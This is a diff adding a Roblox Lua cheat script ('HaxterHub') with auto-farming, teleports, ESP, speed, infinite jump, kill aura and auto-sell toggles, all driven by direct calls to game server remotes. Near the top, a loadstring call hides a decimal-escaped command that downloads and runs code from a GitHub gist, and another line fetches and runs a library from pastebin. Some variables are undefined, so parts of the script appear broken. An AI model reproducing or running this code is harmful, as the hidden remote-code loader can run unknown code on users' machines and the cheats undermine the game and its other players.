@@ -1,0 +1,779 @@
+game.StarterGui:SetCore("SendNotification", {
+    Title = "HaxterHub!"; 
+    Text = "Successfully Executed!"; 
+    Icon = "http://www.roblox.com/asset/?id=9680636205"; 
+    Duration = 5;
+    Callback = bindableFunction;
+    Button1 = "Like";  
+    Button2 = "Dislike";
+})
+
+wait(2)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(701, 196, -211)
+wait(2)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1187, 379, 110)
+wait(2)
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1495, 338, -699)
+wait(3)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1021, 295, -1771)
+
+
+local vermLib = loadstring(game:HttpGet("https://pastebin.com/raw/NQj0ffUL"))()
+
+local window = vermLib:CreateWindow()
+local main = window:CreateTab("main", "Bosses", "") -- framename, threadname, author
+local Mobs = window:CreateTab("Mobs", "mobs", "")
+local Ore = window:CreateTab("Ore", "Ore", "") -- framename, threadname, author
+local Farming = window:CreateTab("Farming", "Farming", "") -- framename, threadname, author
+local SpiritFarm = window:CreateTab("SpiritFarm", "SpiritFarm", "") -- framename, threadname, author
+local Teleports = window:CreateTab("Teleports", "Teleports", "") -- framename, threadname, author
+local Mods = window:CreateTab("Mods", "Mods", "") -- framename, threadname, author
+
+main:CreateToggle("Slimeking", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+while wait(0.3) do
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,10,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.slimeKing.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.slimeKing
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+
+end
+end
+end)
+
+
+main:CreateToggle("Slimequeen", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+while wait(0.3) do
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,10,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.slimeQueen.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.slimeQueen
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+
+end
+end
+end)
+main:CreateToggle("Kor", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait(0.1)
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.golem.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.golem
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+
+    end
+end)
+
+main:CreateToggle("Wizard Boss", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait(0.1)
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.wizardBoss.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.wizardBoss
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    end
+end)
+main:CreateToggle("Bhaa", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait(0.1)
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.desertBoss.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.desertBoss
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    end
+end)
+main:CreateToggle("Dragon", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait(0.2)
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.magmaDragon.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.magmaDragon
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+
+end
+end)
+
+Mobs:CreateToggle("Slime", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait(0.1)
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.slime.HumanoidRootPart.CFrame)
+local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.slime
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    end
+end)
+Mobs:CreateToggle("Buffalkor", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait(0.2)
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.buffalkor.HumanoidRootPart.CFrame)
+
+local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.buffalkor
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+end
+end)
+Mobs:CreateToggle("RockMimic", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait()
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.rockMimic.rock_monster_mesh.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.rockMimic
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+end
+end)
+Mobs:CreateToggle("Lizards", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait()
+    function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.wizardLizard.HumanoidRootPart.CFrame)
+
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.wizardLizard
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+end
+end)
+Mobs:CreateToggle("Iron Skorp", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait()
+function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.skorpIron.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.skorpIron
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+end
+end)
+Mobs:CreateToggle("Gold Skorp", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait()
+function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.skorpGold.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.skorpGold
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+end
+end)
+Mobs:CreateToggle("Ruby Skorp", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait()
+function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.skorpRuby.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.skorpRuby
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+end
+end)
+
+Mobs:CreateToggle("Blobs", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait()
+function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.magmaBlob.HumanoidRootPart.CFrame)
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.magmaBlob
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+end
+end)
+Orelist = {"Iron","Electrite","Stone","Coal","Gold","Andesite","Clay","Diamond","Opal","DiamondEnchanted"}
+
+local dropdown = Ore:CreateDropdown("Ore", Orelist, function(CurrentOption) -- dropdownname, list, callback
+Ore = nil
+Ore = CurrentOption
+end)
+
+dropdown:Refresh(Orelist) -- refresh dropdown with new options
+Ore:CreateToggle("Farm Ore", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+local rock = game:GetService("Workspace").WildernessBlocks:FindFirstChild("rock"..Ore)
+if rock ~= nil then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = rock.CFrame + Vector3.new(0,1,0)
+local A_1 = 
+{
+	["player_tracking_category"] = "join_from_web",
+	["part"] = rock["1"],
+	["block"] = rock,
+	["norm"] = Vector3.new(0,0,0),
+	["pos"] = rock.Position
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_BLOCK_HIT_REQUEST"]
+Event:InvokeServer(A_1)
+end	
+wait()
+end    
+end)
+Farmlist = {"berry","blueberry","lol","lol","none"}
+
+local dropdown = Farming:CreateDropdown("Choose To Farm", Farmlist, function(CurrentOption) -- dropdownname, list, callback
+Farming = nil
+Farming = CurrentOption
+end)
+
+dropdown:Refresh(Farmlist) -- refresh dropdown with new options
+Farming:CreateToggle("Start Farm", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+local Bush = game:GetService("Workspace").WildernessBlocks:FindFirstChild("Bush"..harvest)
+if Bush ~= nil then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Bush.CFrame + Vector3.new(0,1,0)
+local args = {
+    [1] = {
+        ["player"] = game:GetService("Players").LocalPlayer,
+        ["player_tracking_category"] = "join_from_web",
+        ["model"] = workspace.Islands:FindFirstChild("54ff3df8-f0de-4b9e-b6b3-152df961fe16-island").Blocks.Bush
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_HARVEST_CROP_REQUEST:InvokeServer(unpack(args))
+end
+wait()
+end    
+end)
+
+
+SpiritFarm:CreateToggle("Farm Spirit", function(state) -- togglename, callback
+getgenv().autofarm = state
+while true do
+if not getgenv().autofarm then return end
+wait()
+function teleportto(placeCFrame)
+    local plr = game.Players.LocalPlayer;
+    if plr.Character then
+        plr.Character.HumanoidRootPart.CFrame = placeCFrame + Vector3.new(0,1,0)
+         end
+end
+
+teleportto(game:GetService("Workspace").WildernessIsland.Entities.spirit.Bigspirit1.CFrame)
+local args = {
+    [1] = {
+        ["entity"] = getNil("spirit", "Model")
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_CATCH_INSECT:InvokeServer(unpack(args))
+end
+end)
+
+
+Teleports:CreateButton("Slime Queen", function()  -- buttonname, callback
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(803, 167, 140)
+end)
+
+Teleports:CreateButton("Slime Summon", function()  -- buttonname, callback
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(726, 167, 140)
+end)
+
+
+Teleports:CreateButton("Kor Summon", function()  -- buttonname, callback
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2867, 285, 1177)
+end)
+
+Teleports:CreateButton("Wizard Summon", function()  -- buttonname, callback
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1805, 412, -990)
+end)
+
+Teleports:CreateButton("Bhaa Summon", function()  -- buttonname, callback
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(644, 309, -2075)
+end)
+
+Teleports:CreateButton("Dragon Summon", function()  -- buttonname, callback
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9196, 407, -1402)
+end)
+
+Mods:CreateToggle("Esp", function(state)  -- buttonname, callback
+getgenv().autofarm = state
+if not getgenv().autofarm then return end
+local esp_settings = { ---- table for esp settings 
+    textsize = 20,
+    colour = 255,255,255
+}
+ 
+local gui = Instance.new("BillboardGui")
+local esp = Instance.new("TextLabel",gui) ---- new instances to make the billboard gui and the textlabel
+ 
+ 
+ 
+gui.Name = "Cracked esp"; ---- properties of the esp
+gui.ResetOnSpawn = false
+gui.AlwaysOnTop = true;
+gui.LightInfluence = 0;
+gui.Size = UDim2.new(1.75, 0, 1.75, 0);
+esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+esp.Text = ""
+esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
+esp.BorderSizePixel = 4;
+esp.BorderColor3 = Color3.new(esp_settings.colour)
+esp.BorderSizePixel = 0
+esp.Font = "GothamSemibold"
+esp.TextSize = esp_settings.textsize
+esp.TextColor3 = Color3.fromRGB(esp_settings.colour) -- text colour
+
+game:GetService("RunService").RenderStepped:Connect(function() ---- loops faster than a while loop :)
+    for i,v in pairs (game:GetService("Players"):GetPlayers()) do
+        if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Cracked esp")==nil  then -- craeting checks for team check, local player etc
+            esp.Text = ""..v.Name..""
+            gui:Clone().Parent = v.Character.Head
+    end
+end
+end)
+end)
+Mods:CreateToggle("Speed", function(state)  -- buttonname, callback
+getgenv().autofarm = state
+while true do 
+    wait()
+if not getgenv().autofarm then return end
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100 
+end
+end)
+
+Mods:CreateToggle("Infinite jump", function(state)  -- buttonname, callback
+getgenv().autofarm = state
+if not getgenv().autofarm then return 
+    end
+    game:GetService("UserInputService").JumpRequest:connect(function() do
+        game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+    
+end
+end)
+end)
+
+Mods:CreateToggle("Kill Aura", function(state)  -- buttonname, callback
+game:GetService("RunService").RenderStepped:Connect(function(state) ---- loops faster than a while loop :)
+getgenv().autofarm = state
+if not getgenv().autofarm then return
+    end local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.slimeKing
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.golem
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.wizardBoss
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.desertBoss
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.magmaDragon
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.slime
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.buffalkor
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.rockMimic
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.wizardLizard
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.skorpIron
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.skorpGold
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.skorpRuby
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+    local args = {
+    [1] = {
+        ["crit"] = false,
+        ["hitUnit"] = workspace.WildernessIsland.Entities.magmaBlob
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_SWING_SWORD:InvokeServer(unpack(args))
+
+
+    end)
+
+end)
+
+
+Mods:CreateToggle("Auto Sell", function(state)  -- buttonname, callback
+getgenv().autofarm = state
+if not getgenv().autofarm then return end
+while wait() do
+local args = {
+    [1] = {
+        ["merchant"] = "cropSell",
+        ["offerId"] = 1,
+        ["amount"] = all
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_MERCHANT_ORDER_REQUEST:InvokeServer(unpack(args))
+wait()
+local args = {
+    [1] = {
+        ["merchant"] = "cropSell",
+        ["offerId"] = 50,
+        ["amount"] = all
+    }
+}
+
+game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.CLIENT_MERCHANT_ORDER_REQUEST:InvokeServer(unpack(args))
+wait()
+-- Script generated by R2Sv2
+-- R2Sv2 developed by Luckyxero
+ 
+-- Script generated by R2Sv2
+-- R2Sv2 developed by Luckyxero
+ 
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 2, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+-- Script generated by R2Sv2
+-- R2Sv2 developed by Luckyxero
+ 
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 3, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 6, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 7, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 8, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 9, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 10, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+local A_1 = 
+{
+	["merchant"] = "cropSell", 
+	["offerId"] = 11, 
+	["amount"] = all
+}
+local Event = game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"]["CLIENT_MERCHANT_ORDER_REQUEST"]
+Event:InvokeServer(A_1)
+wait()
+end
+end)
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "HaxterHub!"; 
+    Text = "Successfully Loaded!"; 
+    Icon = "http://www.roblox.com/asset/?id=9680636205"; 
+    Duration = 5;
+    Callback = bindableFunction;
+    Button1 = "Like";  
+    Button2 = "Dislike";
+})
